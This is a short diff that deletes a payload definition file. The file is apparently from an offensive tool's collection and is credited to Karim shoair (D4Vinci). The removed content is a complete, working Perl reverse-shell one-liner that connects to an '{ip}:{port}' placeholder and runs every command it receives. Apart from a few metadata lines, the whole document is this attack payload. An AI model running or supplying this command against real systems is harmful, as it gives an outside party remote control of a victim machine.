@@ -1,8 +1,0 @@
-[Info]
-Author      = Karim shoair (D4Vinci)
-Description = Uses perl to create a reverse shell
-
-[Payload]
-Type     = Reverser
-Payload  =
-perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"{ip}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
